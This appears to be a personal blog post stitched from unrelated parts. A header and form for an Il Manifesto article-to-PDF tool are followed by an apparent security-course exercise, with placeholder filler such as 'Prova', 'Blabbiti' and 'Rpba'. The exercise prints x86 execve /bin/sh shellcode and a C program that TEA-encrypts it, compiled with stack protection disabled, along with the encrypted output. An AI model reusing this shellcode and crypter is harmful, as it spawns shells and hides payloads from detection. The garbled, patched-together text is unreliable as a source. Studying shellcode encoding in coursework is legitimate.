---
layout: post
title:  "il Manifesto 2 pdf"
date:   06-10-2018
categories: tools
---
<br />

<script type="text/javascript" src="../js/jquery-3.3.1.min.js"></script>
<script type="text/javascript" src="../js/manifesto.js"></script>

<style> 
input[type=text] {
    width: 100%;
    padding: 12px 20px;
    margin: 8px 0;
    box-sizing: border-box;
    border: 2px solid red;
    border-radius: 4px;
}
</style>

<center>
	Inserisci l'url all'articolo de Il Manifesto che vuoi scaricare: <br><br>
<form id="frm1">
  <input type="text" name="fname" value="URL COMPLETO"><br>
</form>
<br>
<button onclick="myFunction()">Ottieni PDF</button>
</center>

<p id="link"></p>

<script>
function myFunction() {
    var x = document.getElementById("frm1");
    var text = "";
    var i;
    for (i = 0; i < x.length ;i++) {
        text += x.elements[i].value;
    }
    link2pdf(text);
}
</script>


Student **Prova**  
Github: [https://github.com/massimobedini](https://github.com/massimobedini)  
[http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)  
  
## Prova 7:  
    
**Prova:**  
> *Uno*
 - *Due*
 - *Tre*  
  
Ciao a tutti,  
Blabbiti: 
*'Quote.'*  
 
  
Canic [link](http://www.tayloredge.com/reference/Mathematics/TEA-XTEA.pdf).  

Shellcode:  
```
\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```

Rpba:  
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void encode(long *data, long *key) {
	unsigned long y = data[0], z = data[1],
	sum = 0, delta = 0x9e3779b9, n = 32;
	while (n-- > 0) {
		sum += delta;
		y += (z << 4) + (key[0]^z) + (sum^(z >> 5)) + key[1];
		z += (y << 4) + (key[2]^y) + (sum^(y >> 5)) + key[3];
	}
	data[0] = y;
	data[1] = z;
}

void decode(long *data, long *key) {
	unsigned long n = 32, sum, y = data[0], z = data[1],
	delta=0x9e3779b9;
	sum = delta << 5;
	while (n-- > 0) {
	     	z -= (y << 4) + (key[2]^y) + (sum^(y >> 5)) + key[3]; 
	     	y -= (z << 4) + (key[0]^z) + (sum^(z >> 5)) + key[1];
	     	sum -= delta;  
	}
	data[0] = y; 
	data[1] = z;  
}

/* Character Array Functions */
void codestr(char *datastr, char *keystr) {
	int i = 0, datasize;
	long *data = (long *)datastr;
	long *key = (long *)keystr;
	datasize = strlen(datastr) / sizeof(long);
	datasize = 0 ? 1 : datasize;
	while (i < datasize) {
		encode(data, key);
		i += 2;
		data = (long *)datastr + i;
	}
}

void decodestr(char *datastr, char *keystr) {
	int i = 0, datasize;
	long *data = (long *)datastr;
	long *key = (long *)keystr;
	datasize = strlen(datastr) / sizeof(long);
	datasize = 0 ? 1 : datasize;
	while (i < datasize) {
		decode(data, key);
		i += 2;
		data = (long *)datastr + i;
	}
}

int main() {
	char shellcode[] = \
	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; //execve-stack
	
	int last;
	char *str, buff[512];
	char key[16] = "iloveshellcodess";
	
	str = shellcode;

	codestr(str, key);

	printf("\Ciphered shellcode size: %d\n", strlen(str));
	printf("\Ciphered shellcode:\n");

	int j;
	for (j=0;j<strlen(str);j++)
	{
		printf("\\x%02x", (unsigned char)(int)str[j]);
	}
	
	return 0;
}
```
  
Bash:
```bash
# gcc -fno-stack-protector -z execstack -o tea_crypter tea_crypter.c && chmod u+x ./tea_crypter && ./tea_crypter
Ciphered shellcode size: 25
Ciphered shellcode:
\x75\xac\xf4\x4c\x4f\x97\x9a\x0a\x92\xb5\x29\x5f\x9e\xa3\xa0\x53\xa7\xa9\xcd\x3c\x6f\x85\xee\x95\x80
```  
  
Ciao.
  
[Massimo](https://twitter.com/massimobedini)
